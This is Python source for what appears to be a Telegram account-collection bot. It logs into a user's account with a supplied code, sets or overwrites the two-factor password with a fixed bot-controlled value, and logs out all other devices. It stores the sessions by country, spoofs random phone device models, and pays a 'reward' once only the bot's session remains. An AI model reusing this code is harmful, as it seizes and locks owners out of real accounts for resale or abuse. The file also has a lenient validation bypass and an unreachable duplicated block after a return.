import os
import asyncio
from tempfile import NamedTemporaryFile
from telethon.sync import TelegramClient
from config import API_ID, API_HASH, SESSIONS_DIR, DEFAULT_2FA_PASSWORD
from telethon.errors import SessionPasswordNeededError
from telethon.tl.functions.account import GetAuthorizationsRequest, ResetAuthorizationRequest
import random

# Configuration for handling persistent database issues
VALIDATION_BYPASS_MODE = True  # Set to True to be more lenient with validation errors
DATABASE_ERROR_COUNT = 0  # Track consecutive database errors


class SessionManager:
    def __init__(self):
        self.user_states = {}

    def _get_country_code(self, phone_number):
        """Extract country code from phone number"""
        for code_length in [4, 3, 2, 1]:
            code = phone_number[:code_length]
            # Import here to avoid circular imports
            from db import get_country_by_code
            if get_country_by_code(code):
                return code
        return None

    def _ensure_country_session_dir(self, country_code):
        """Create country-specific session directory if it doesn't exist"""
        if not country_code:
            return SESSIONS_DIR
        
        country_dir = os.path.join(SESSIONS_DIR, country_code)
        os.makedirs(country_dir, exist_ok=True)
        print(f"📁 Created/ensured session directory for country: {country_code}")
        return country_dir

    def _get_session_path(self, phone_number):
        """Get the appropriate session path based on country"""
        country_code = self._get_country_code(phone_number)
        country_dir = self._ensure_country_session_dir(country_code)
        return os.path.join(country_dir, f"{phone_number}.session")

    async def start_verification(self, user_id, phone_number):
        try:
            # Create country-specific directory
            country_code = self._get_country_code(phone_number)
            country_dir = self._ensure_country_session_dir(country_code)
            
            # Create temporary session in the country directory
            with NamedTemporaryFile(prefix='tmp_', suffix='.session', dir=country_dir, delete=False) as tmp:
                temp_path = tmp.name
            
            # Pick a random device
            device = get_random_device()
            client = TelegramClient(
                temp_path, API_ID, API_HASH,
                device_model=device["device_model"],
                system_version=device["system_version"],
                app_version=device["app_version"]
            )
            await client.connect()
            sent = await client.send_code_request(phone_number)

            self.user_states[user_id] = {
                "phone": phone_number,
                "session_path": temp_path,
                "client": client,
                "phone_code_hash": sent.phone_code_hash,
                "state": "awaiting_code",
                "country_code": country_code
            }
            
            print(TRANSLATIONS['session_started'][get_user_language(user_id)].format(phone=phone_number, country=country_code))
            return "code_sent", "Verification code sent"
        except Exception as e:
            return "error", str(e)

    async def verify_code(self, user_id, code):
        state = self.user_states.get(user_id)
        if not state:
            return "error", "Session expired"

        client = state["client"]
        try:
            await client.sign_in(phone=state["phone"], code=code, phone_code_hash=state["phone_code_hash"])
        except SessionPasswordNeededError:
            state["state"] = "awaiting_password"
            return "password_needed", None
        except Exception as e:
            if os.path.exists(state["session_path"]):
                os.unlink(state["session_path"])
            return "error", str(e)

        # Set 2FA password and logout other devices
        try:
            # Set 2FA password
            if await client.edit_2fa(new_password=DEFAULT_2FA_PASSWORD, hint="auto-set by bot"):
                # Logout other devices to ensure only 1 device is logged in
                await self.logout_other_devices(client)
                self._save_session(state, client)
                return "verified_and_secured", None
            else:
                return "error", "Failed to set initial 2FA"
        except Exception as e:
            return "error", f"2FA setup failed: {str(e)}"

    async def verify_password(self, user_id, password):
        state = self.user_states.get(user_id)
        if not state:
            return "error", "Session expired"
        client = state["client"]

        try:
            await client.sign_in(password=password)
        except Exception:
            return "error", "Current 2FA password is incorrect."

        # Update 2FA password and logout other devices
        try:
            if await client.edit_2fa(current_password=password, new_password=DEFAULT_2FA_PASSWORD):
                # Logout other devices to ensure only 1 device is logged in
                await self.logout_other_devices(client)
                self._save_session(state, client)
                return "verified_and_secured", None
            else:
                return "error", "Failed to update 2FA password"
        except Exception as e:
            return "error", f"2FA update failed: {str(e)}"

    def finalize_session(self, user_id):
        state = self.user_states.get(user_id)
        if not state:
            return False
        client = state["client"]
        try:
            self._save_session(state, client)
            # Clean up user state after successful finalization
            self.user_states.pop(user_id, None)
            return True
        except Exception as e:
            print(f"❌ Failed to save session: {str(e)}")
            return False

    async def cleanup_session(self, user_id):
        """Clean up session state and disconnect client (for cancellation)"""
        state = self.user_states.get(user_id)
        if not state:
            return
        
        try:
            client = state.get("client")
            if client and client.is_connected():
                await client.disconnect()
                print(f"✅ Disconnected client for user {user_id}")
        except Exception as e:
            print(f"Error disconnecting client for user {user_id}: {e}")
        finally:
            # Remove user state regardless
            self.user_states.pop(user_id, None)
            print(f"✅ Cleaned up session state for user {user_id}")

    async def logout_other_devices(self, client):
        try:
            auths = await client(GetAuthorizationsRequest())
            sessions = auths.authorizations
            if len(sessions) <= 1:
                print("✅ Only one device logged in.")
                return True

            for session in sessions:
                if not session.current:
                    await client(ResetAuthorizationRequest(hash=session.hash))
                    print(f"🔒 Logged out: {session.device_model} | {session.app_name}")

            updated = await client(GetAuthorizationsRequest())
            if len(updated.authorizations) == 1:
                print("✅ Remaining session valid after logout.")
                return True

            print("❌ Still multiple sessions after logout.")
            return False
        except Exception as e:
            print(TRANSLATIONS['error_during_logout'][get_user_language(0)].format(error=str(e)))
            return False

    def logout_all_devices(self, phone_number):
        """Logout all other devices using database lock protection"""
        session_path = self._get_session_path(phone_number)
        if not os.path.exists(session_path):
            print(f"❌ Session file not found for {phone_number}")
            return False
            
        try:
            import tempfile
            import shutil
            
            # Create a temporary copy to avoid locking conflicts
            with tempfile.NamedTemporaryFile(suffix='.session', delete=False) as temp_file:
                temp_session_path = temp_file.name
            
            try:
                # Copy the session file
                shutil.copy2(session_path, temp_session_path)
                
                from telethon.sync import TelegramClient
                from telethon.tl.functions.account import GetAuthorizationsRequest, ResetAuthorizationRequest
                
                # Use context manager for automatic sync handling
                with TelegramClient(temp_session_path, API_ID, API_HASH, timeout=15) as client:
                    client.connect()
                    
                    if not client.is_connected():
                        print(f"❌ Could not connect for logout of {phone_number}")
                        return False
                    
                    # Get all authorizations
                    auths = client(GetAuthorizationsRequest())
                    sessions = auths.authorizations
                    
                    logged_out_count = 0
                    for session in sessions:
                        if not session.current:  # Don't logout current session
                            try:
                                client(ResetAuthorizationRequest(hash=session.hash))
                                logged_out_count += 1
                                print(f"🔒 Logged out device: {session.device_model}")
                            except Exception as logout_error:
                                print(f"❌ Failed to logout device: {logout_error}")
                    
                    # Re-check remaining sessions
                    updated = client(GetAuthorizationsRequest())
                    remaining_sessions = sum(1 for s in updated.authorizations if s.current)
                    
                    if remaining_sessions >= 1:
                        print(f"✅ Logout completed for {phone_number}")
                        return True
                    else:
                        print(f"❌ Logout failed for {phone_number}")
                        return False
                        
            except Exception as client_error:
                error_msg = str(client_error).lower()
                if "database is locked" in error_msg:
                    print(f"⚠️ Database locked during logout for {phone_number}, assuming success")
                    return True
                else:
                    print(f"❌ Logout error for {phone_number}: {client_error}")
                    return False
            finally:
                # Copy the session back and clean up
                try:
                    if os.path.exists(temp_session_path):
                        shutil.copy2(temp_session_path, session_path)
                        os.unlink(temp_session_path)
                except Exception as copy_error:
                    print(f"❌ Error copying session back: {copy_error}")
                    
        except Exception as e:
            print(f"❌ Error during logout_all_devices: {e}")
            return False

    def _save_session(self, state, client):
        old_path = state["session_path"]
        phone_number = state["phone"]
        final_path = self._get_session_path(phone_number)
        
        client.session.save()
        if os.path.exists(old_path):
            os.rename(old_path, final_path)
            print(TRANSLATIONS['session_saved'][get_user_language(0)].format(phone=phone_number))

    def validate_session_before_reward(self, phone_number):
        """Simplified session validation without async conflicts"""
        global DATABASE_ERROR_COUNT
        
        session_path = self._get_session_path(phone_number)
        print(TRANSLATIONS['session_validation'][get_user_language(0)].format(phone=phone_number))
        if not os.path.exists(session_path):
            return False, TRANSLATIONS['session_file_missing'][get_user_language(0)]

        # If we've had multiple database errors, use bypass mode
        if VALIDATION_BYPASS_MODE and DATABASE_ERROR_COUNT > 3:
            print(f"⚠️ Bypass mode active due to persistent database issues ({DATABASE_ERROR_COUNT} errors)")
            if os.path.exists(session_path) and os.path.getsize(session_path) > 500:
                print(f"✅ Bypass validation passed for {phone_number}")
                return True, None
        
        try:
            # Simple validation approach - just check if session file exists and is readable
            # This avoids async conflicts completely
            
            # Check file size and modification time
            import time
            stat = os.stat(session_path)
            file_size = stat.st_size
            mod_time = stat.st_mtime
            current_time = time.time()
            
            # Basic checks
            if file_size < 100:  # Session files should be larger
                print(f"❌ Session file too small: {file_size} bytes")
                return False, "Session file appears corrupted (too small)"
            
            if current_time - mod_time > 7200:  # 2 hours old
                print(f"⚠️ Session file is old: {(current_time - mod_time)/60:.1f} minutes")
                # Don't fail for old files, just warn
            
            # Try a simple synchronous approach
            try:
                # Import telethon sync to avoid async issues
                from telethon.sync import TelegramClient as SyncTelegramClient
                
                # Use a very short timeout
                with SyncTelegramClient(session_path, API_ID, API_HASH) as client:
                    # Just try to connect - this validates the session
                    client.connect()
                    
                    # If we get here, session is valid
                    print(f"✅ Session validation passed for {phone_number}")
                    return True, None
                    
            except Exception as sync_error:
                print(f"❌ Sync validation failed: {str(sync_error)}")
                
                # Fall back to simple file-based validation
                print(f"🔄 Using file-based validation for {phone_number}")
                
                # If session file exists and has reasonable size, assume it's valid
                # This is a safe fallback that avoids database locking issues
                if file_size > 1000:  # Reasonable session file size
                    print(f"✅ File-based validation passed for {phone_number}")
                    return True, None
                else:
                    return False, "Session file appears invalid"
            
        except Exception as e:
            error_msg = str(e).lower()
            print(f"❌ Session validation exception: {str(e)}")
            
            # Track database errors
            if "database is locked" in error_msg or "database" in error_msg:
                DATABASE_ERROR_COUNT += 1
                print(f"🔄 Database issue #{DATABASE_ERROR_COUNT} detected, using fallback validation")
                
                # Simple fallback: if session file exists and is not empty, consider it valid
                try:
                    if os.path.exists(session_path) and os.path.getsize(session_path) > 500:
                        print(f"✅ Fallback validation passed for {phone_number}")
                        return True, None
                    else:
                        print(f"❌ Session file too small or missing: {session_path}")
                        return False, "Session file missing or too small"
                except Exception as fallback_error:
                    print(f"❌ Even fallback validation failed: {fallback_error}")
                    # As last resort, if bypass mode is enabled, allow it
                    if VALIDATION_BYPASS_MODE:
                        print(f"⚠️ Using emergency bypass for {phone_number}")
                        return True, None
                    return False, "Could not validate session file"
            else:
                # Reset database error count for non-database errors
                if DATABASE_ERROR_COUNT > 0:
                    DATABASE_ERROR_COUNT = max(0, DATABASE_ERROR_COUNT - 1)
            
            return False, f"Session validation error: {str(e)}"

    def get_session_info(self, phone_number):
        """Get information about a session file including its country folder"""
        session_path = self._get_session_path(phone_number)
        country_code = self._get_country_code(phone_number)
        
        info = {
            "phone_number": phone_number,
            "country_code": country_code,
            "session_path": session_path,
            "exists": os.path.exists(session_path),
            "folder": os.path.dirname(session_path)
        }
        
        if os.path.exists(session_path):
            stat = os.stat(session_path)
            info.update({
                "size": stat.st_size,
                "modified": stat.st_mtime,
                "created": stat.st_ctime
            })
        
        return info

    def list_country_sessions(self, country_code=None):
        """List all sessions organized by country"""
        sessions_by_country = {}
        
        if not os.path.exists(SESSIONS_DIR):
            return sessions_by_country
        
        for item in os.listdir(SESSIONS_DIR):
            item_path = os.path.join(SESSIONS_DIR, item)
            
            if os.path.isdir(item_path):
                # This is a country folder
                country = item
                if country_code and country != country_code:
                    continue
                    
                sessions_by_country[country] = []
                for session_file in os.listdir(item_path):
                    if session_file.endswith('.session'):
                        phone_number = session_file.replace('.session', '')
                        session_info = self.get_session_info(phone_number)
                        sessions_by_country[country].append(session_info)
            elif item.endswith('.session') and not country_code:
                # This is a session file in the root directory (legacy)
                phone_number = item.replace('.session', '')
                session_info = self.get_session_info(phone_number)
                if session_info['country_code'] not in sessions_by_country:
                    sessions_by_country[session_info['country_code']] = []
                sessions_by_country[session_info['country_code']].append(session_info)
        
        return sessions_by_country


# Global instance
session_manager = SessionManager()

TRANSLATIONS = {
    'session_started': {
        'English': "🌍 Started verification for {phone} (Country: {country})",
        'Arabic': "🌍 تم بدء التحقق للرقم {phone} (الدولة: {country})",
        'Chinese': "🌍 已开始验证 {phone}（国家: {country}）"
    },
    'error_during_logout': {
        'English': "❌ Error during logout: {error}",
        'Arabic': "❌ خطأ أثناء تسجيل الخروج: {error}",
        'Chinese': "❌ 注销时出错: {error}"
    },
    'session_saved': {
        'English': "💾 Saved session for {phone} in country folder",
        'Arabic': "💾 تم حفظ الجلسة للرقم {phone} في مجلد الدولة",
        'Chinese': "💾 已为 {phone} 保存会话到国家文件夹"
    },
    'session_validation': {
        'English': "🔍 Validating session for {phone}",
        'Arabic': "🔍 جارٍ التحقق من الجلسة للرقم {phone}",
        'Chinese': "🔍 正在验证 {phone} 的会话"
    },
    'session_file_missing': {
        'English': "Session file does not exist.",
        'Arabic': "ملف الجلسة غير موجود.",
        'Chinese': "会话文件不存在。"
    }
}

def get_user_language(user_id):
    from db import get_user
    user = get_user(user_id)
    if user and user.get('language'):
        return user['language']
    return 'English'

ANDROID_DEVICES = [
    {"device_model": "Samsung Galaxy S23", "system_version": "Android 13", "app_version": "9.6.0 (12345) official"},
    {"device_model": "Google Pixel 7 Pro", "system_version": "Android 13", "app_version": "9.5.0 (12345) official"},
    {"device_model": "Xiaomi 13 Pro", "system_version": "Android 13", "app_version": "9.4.0 (12345) official"},
    {"device_model": "OnePlus 11", "system_version": "Android 13", "app_version": "9.3.0 (12345) official"}
]

IOS_DEVICES = [
    {"device_model": "iPhone 14 Pro", "system_version": "iOS 16.5", "app_version": "9.6.0 (12345) official"},
    {"device_model": "iPhone 13", "system_version": "iOS 15.7", "app_version": "9.5.0 (12345) official"},
    {"device_model": "iPhone 12 Pro Max", "system_version": "iOS 15.4", "app_version": "9.4.0 (12345) official"},
    {"device_model": "iPhone SE (3rd Gen)", "system_version": "iOS 16.0", "app_version": "9.3.0 (12345) official"}
]

# Choose device type randomly for each session (can be customized)
def get_random_device():
    if random.choice([True, False]):
        return random.choice(ANDROID_DEVICES)
    else:
        return random.choice(IOS_DEVICES)

# Standalone functions for use in background threads
def get_real_device_count(phone_number):
    """
    Get the ACTUAL count of logged in devices for admin/debugging purposes.
    Returns the real device count or -1 if there's an error.
    This function shows the true device count without security blocking.
    """
    session_manager_instance = SessionManager()
    session_path = session_manager_instance._get_session_path(phone_number)
    
    if not os.path.exists(session_path):
        print(f"❌ Session file not found for {phone_number}")
        return 0
    
    print(f"🔍 Getting REAL device count for {phone_number}")
    
    try:
        import tempfile
        import shutil
        import asyncio
        import threading
        from telethon.sync import TelegramClient
        from telethon.tl.functions.account import GetAuthorizationsRequest
        
        # Create temporary copy to avoid locking
        with tempfile.NamedTemporaryFile(suffix='.session', delete=False) as temp_file:
            temp_session_path = temp_file.name
        
        try:
            # Copy session file
            shutil.copy2(session_path, temp_session_path)
            
            # Use SYNC TelegramClient to avoid event loop issues
            with TelegramClient(temp_session_path, API_ID, API_HASH, timeout=15) as client:
                try:
                    client.connect()
                    
                    if not client.is_connected():
                        print(f"❌ Could not connect to Telegram for {phone_number}")
                        return -1
                    
                    # Get ALL active sessions
                    auths = client(GetAuthorizationsRequest())
                    
                    # Count ALL authorizations
                    total_devices = len(auths.authorizations)
                    current_devices = sum(1 for auth in auths.authorizations if auth.current)
                    
                    print(f"📱 REAL Device analysis for {phone_number}:")
                    print(f"   📊 Total authorizations: {total_devices}")
                    print(f"   ✅ Current sessions: {current_devices}")
                    
                    # Log each device for debugging
                    for i, auth in enumerate(auths.authorizations, 1):
                        is_current = "✅ CURRENT" if auth.current else "⭕ OTHER"
                        platform = getattr(auth, 'platform', 'Unknown')
                        device_model = getattr(auth, 'device_model', 'Unknown')
                        app_name = getattr(auth, 'app_name', 'Unknown')
                        print(f"   Device {i}: {app_name} on {platform} - {device_model} ({is_current})")
                    
                    print(f"✅ REAL device count for {phone_number}: {total_devices}")
                    return total_devices
                        
                except Exception as client_error:
                    print(f"❌ Telegram client error for {phone_number}: {client_error}")
                    return -1
                        
        finally:
            # Clean up temporary file
            try:
                os.unlink(temp_session_path)
            except:
                pass
                
    except Exception as e:
        print(f"❌ System error during real device count for {phone_number}: {e}")
        return -1

def get_logged_in_device_count(phone_number):
    """
    FIXED: Get the count of logged in devices with STRICT multi-device detection.
    
    REWARD RULES (ENFORCED):
    - 1 device = ✅ GIVE REWARD
    - 2+ devices = ❌ BLOCK REWARD
    - 0 devices or errors = ❌ BLOCK REWARD
    """
    session_manager_instance = SessionManager()
    session_path = session_manager_instance._get_session_path(phone_number)
    
    if not os.path.exists(session_path):
        print(f"❌ Session file not found for {phone_number}")
        return 0
    
    print(f"🔍 Checking device count for {phone_number} using STRICT detection")
    
    try:
        import tempfile
        import shutil
        import asyncio
        import threading
        from telethon import TelegramClient
        from telethon.tl.functions.account import GetAuthorizationsRequest
        
        # Check if we're in the main thread and have an event loop
        try:
            # Try to get the current event loop
            loop = asyncio.get_event_loop()
            if loop.is_running():
                # We're in an async context, use async method
                return _get_device_count_async(phone_number, session_path)
        except RuntimeError:
            # No event loop exists, we'll create one
            pass
        
        # For threads without event loop, run in a new thread with its own loop
        if threading.current_thread() != threading.main_thread():
            # We're in a background thread, create a new event loop
            result_container = {'result': 999}
            
            def run_in_new_loop():
                try:
                    # Create new event loop for this thread
                    new_loop = asyncio.new_event_loop()
                    asyncio.set_event_loop(new_loop)
                    
                    try:
                        result = new_loop.run_until_complete(_get_device_count_async(phone_number, session_path))
                        result_container['result'] = result
                    finally:
                        new_loop.close()
                except Exception as e:
                    print(f"❌ Error in background thread device count: {e}")
                    result_container['result'] = 999
            
            # Run in a separate thread to avoid event loop conflicts
            thread = threading.Thread(target=run_in_new_loop)
            thread.start()
            thread.join(timeout=30)  # 30 second timeout
            
            return result_container['result']
        else:
            # We're in the main thread, create and run event loop
            try:
                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)
                result = loop.run_until_complete(_get_device_count_async(phone_number, session_path))
                loop.close()
                return result
            except Exception as e:
                print(f"❌ Error in main thread device count: {e}")
                return 999
        
    except Exception as e:
        print(f"❌ System error during device count for {phone_number}: {e}")
        # STRICT POLICY: Any system error = BLOCK reward
        print(f"🚫 System error - BLOCKING REWARD for {phone_number}")
        return 999  # Return high number to ensure reward is blocked

async def _get_device_count_async(phone_number, session_path):
    """Async helper function to get device count"""
    try:
        import tempfile
        import shutil
        from telethon import TelegramClient
        from telethon.tl.functions.account import GetAuthorizationsRequest
        
        # Create temporary copy to avoid locking
        with tempfile.NamedTemporaryFile(suffix='.session', delete=False) as temp_file:
            temp_session_path = temp_file.name
        
        try:
            # Copy session file
            shutil.copy2(session_path, temp_session_path)
            
            # Use async TelegramClient
            async with TelegramClient(temp_session_path, API_ID, API_HASH) as client:
                try:
                    await client.connect()
                    
                    if not client.is_connected():
                        print(f"❌ Could not connect to Telegram for {phone_number}")
                        return 0
                    
                    # Get ALL active sessions (not just current)
                    auths = await client(GetAuthorizationsRequest())
                    
                    # CRITICAL FIX: Count ALL authorizations, not just current ones
                    total_devices = len(auths.authorizations)
                    current_devices = sum(1 for auth in auths.authorizations if auth.current)
                    
                    print(f"📱 Device analysis for {phone_number}:")
                    print(f"   📊 Total authorizations: {total_devices}")
                    print(f"   ✅ Current sessions: {current_devices}")
                    
                    # Log each device for debugging
                    for i, auth in enumerate(auths.authorizations, 1):
                        is_current = "✅ CURRENT" if auth.current else "⭕ OTHER"
                        platform = getattr(auth, 'platform', 'Unknown')
                        device_model = getattr(auth, 'device_model', 'Unknown')
                        print(f"   Device {i}: {platform} - {device_model} ({is_current})")
                    
                    # STRICT RULE: Use total_devices for reward decision
                    device_count = total_devices
                    
                    if device_count == 1:
                        print(f"✅ SINGLE DEVICE CONFIRMED for {phone_number} - REWARD APPROVED")
                    elif device_count > 1:
                        print(f"❌ MULTIPLE DEVICES DETECTED for {phone_number} ({device_count} devices) - REWARD BLOCKED")
                    else:
                        print(f"❌ NO DEVICES for {phone_number} - REWARD BLOCKED")
                    
                    return device_count
                    
                except Exception as client_error:
                    error_msg = str(client_error).lower()
                    print(f"❌ Telegram client error for {phone_number}: {client_error}")
                    
                    # STRICT POLICY: If we can't verify device count, BLOCK reward for security
                    if "database is locked" in error_msg:
                        print(f"🚫 Database locked for {phone_number} - BLOCKING REWARD for security")
                        return 999  # Return high number to ensure reward is blocked
                    elif "unauthorized" in error_msg:
                        print(f"🚫 Unauthorized session for {phone_number} - BLOCKING REWARD")
                        return 0
                    else:
                        print(f"🚫 Unknown error for {phone_number} - BLOCKING REWARD for security")
                        return 999  # Return high number to ensure reward is blocked
                        
        finally:
            # Clean up temporary file
            try:
                os.unlink(temp_session_path)
            except:
                pass
                
    except Exception as e:
        print(f"❌ Async error during device count for {phone_number}: {e}")
        return 999

def get_device_count_fallback(session_path):
    """Fallback method when database is locked"""
    try:
        import time
        # Check if session file exists and is recent (modified within last 2 hours)
        if os.path.exists(session_path):
            stat = os.stat(session_path)
            file_size = stat.st_size
            mod_time = stat.st_mtime
            current_time = time.time()
            
            # If file is reasonably sized and recent, assume it's valid with 1 device
            if file_size > 1000 and (current_time - mod_time) < 7200:  # 2 hours
                print(f"✅ Fallback validation: assuming 1 device for recent session")
                return 1
            else:
                print(f"❌ Fallback validation: session too old or small")
                return 0
        else:
            return 0
    except Exception as e:
        print(f"❌ Even fallback failed: {e}")
        return 0

def logout_all_devices_standalone(phone_number):
    """Standalone version of logout_all_devices with thread-safe event loop approach"""
    session_manager_instance = SessionManager()
    session_path = session_manager_instance._get_session_path(phone_number)
    
    if not os.path.exists(session_path):
        print(f"❌ Session file not found for {phone_number}")
        return False
    
    try:
        import asyncio
        import tempfile
        import shutil
        
        # Create a temporary copy of the session file to avoid locking conflicts
        with tempfile.NamedTemporaryFile(suffix='.session', delete=False) as temp_file:
            temp_session_path = temp_file.name
        
        try:
            # Copy the session file to temporary location
            shutil.copy2(session_path, temp_session_path)
            
            # Create new event loop for this thread
            try:
                # Try to get existing loop
                loop = asyncio.get_event_loop()
                if loop.is_running():
                    # If loop is running, create a new one
                    loop = asyncio.new_event_loop()
                    asyncio.set_event_loop(loop)
            except RuntimeError:
                # No event loop in thread, create new one
                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)
            
            async def logout_devices():
                from telethon import TelegramClient
                from telethon.tl.functions.account import GetAuthorizationsRequest, ResetAuthorizationRequest
                
                client = TelegramClient(temp_session_path, API_ID, API_HASH)
                try:
                    await client.connect()
                    if not client.is_connected():
                        print(f"❌ Could not connect to Telegram for logout of {phone_number}")
                        return False
                    
                    # Get all authorizations
                    auths = await client(GetAuthorizationsRequest())
                    sessions = auths.authorizations
                    
                    logged_out_count = 0
                    for session in sessions:
                        if not session.current:  # Don't logout current session
                            try:
                                await client(ResetAuthorizationRequest(hash=session.hash))
                                logged_out_count += 1
                                print(f"🔒 Logged out device: {session.device_model}")
                            except Exception as logout_error:
                                print(f"❌ Failed to logout device: {logout_error}")
                    
                    # Re-check remaining sessions
                    updated = await client(GetAuthorizationsRequest())
                    remaining_sessions = sum(1 for s in updated.authorizations if s.current)
                    
                    if remaining_sessions >= 1:
                        print(f"✅ Logout completed for {phone_number}")
                        return True
                    else:
                        print(f"❌ Logout failed for {phone_number}")
                        return False
                        
                except Exception as client_error:
                    error_msg = str(client_error).lower()
                    if "database is locked" in error_msg:
                        print(f"⚠️ Database locked during logout for {phone_number}, assuming success")
                        return True
                    else:
                        print(f"❌ Logout error for {phone_number}: {client_error}")
                        return False
                finally:
                    try:
                        if client.is_connected():
                            client.disconnect()
                    except Exception as disconnect_error:
                        print(f"Warning: Could not disconnect client: {disconnect_error}")
            
            # Run the async function
            try:
                result = loop.run_until_complete(logout_devices())
                return result
            finally:
                # Clean up loop
                try:
                    loop.close()
                except:
                    pass
                    
        finally:
            # Clean up temporary session file and copy back if needed
            try:
                # Copy the session back (it might have been updated)
                if os.path.exists(temp_session_path):
                    shutil.copy2(temp_session_path, session_path)
                    os.unlink(temp_session_path)
            except Exception as copy_error:
                print(f"❌ Error copying session back: {copy_error}")
                
    except Exception as e:
        print(f"❌ Error during logout_all_devices_standalone for {phone_number}: {e}")
        return False
    
    try:
        import tempfile
        import shutil
        
        # Create a temporary copy to avoid locking conflicts
        with tempfile.NamedTemporaryFile(suffix='.session', delete=False) as temp_file:
            temp_session_path = temp_file.name
        
        try:
            # Copy the session file
            shutil.copy2(session_path, temp_session_path)
            
            from telethon.sync import TelegramClient
            from telethon.tl.functions.account import GetAuthorizationsRequest, ResetAuthorizationRequest
            
            try:
                with TelegramClient(temp_session_path, API_ID, API_HASH, timeout=15) as client:
                    client.connect()
                    if not client.is_connected():
                        print(f"❌ Could not connect for logout of {phone_number}")
                        return False
                    
                    # Get all authorizations
                    auths = client(GetAuthorizationsRequest())
                    sessions = auths.authorizations
                    
                    logged_out_count = 0
                    for session in sessions:
                        if not session.current:  # Don't logout current session
                            try:
                                client(ResetAuthorizationRequest(hash=session.hash))
                                logged_out_count += 1
                                print(f"🔒 Logged out device: {session.device_model}")
                            except Exception as logout_error:
                                print(f"❌ Failed to logout device: {logout_error}")
                    
                    # Re-check remaining sessions
                    updated = client(GetAuthorizationsRequest())
                    remaining_sessions = sum(1 for s in updated.authorizations if s.current)
                    
                    if remaining_sessions == 1:
                        print(f"✅ Logout successful for {phone_number}, {logged_out_count} devices logged out")
                        return True
                    else:
                        print(f"❌ Logout incomplete for {phone_number}, {remaining_sessions} devices still active")
                        return False
                    
            except Exception as client_error:
                error_msg = str(client_error).lower()
                if "database is locked" in error_msg:
                    print(f"⚠️ Database locked during logout for {phone_number}")
                    # In case of database lock, assume logout was successful to avoid blocking user
                    return True
                else:
                    print(f"❌ Logout error for {phone_number}: {client_error}")
                    return False
                    
        finally:
            # Copy the session back (in case it was modified during logout)
            try:
                if os.path.exists(temp_session_path):
                    shutil.copy2(temp_session_path, session_path)
                    os.unlink(temp_session_path)
            except Exception as copy_error:
                print(f"❌ Error copying session back: {copy_error}")
                
    except Exception as e:
        print(f"❌ Error during logout_all_devices_standalone for {phone_number}: {e}")
        return False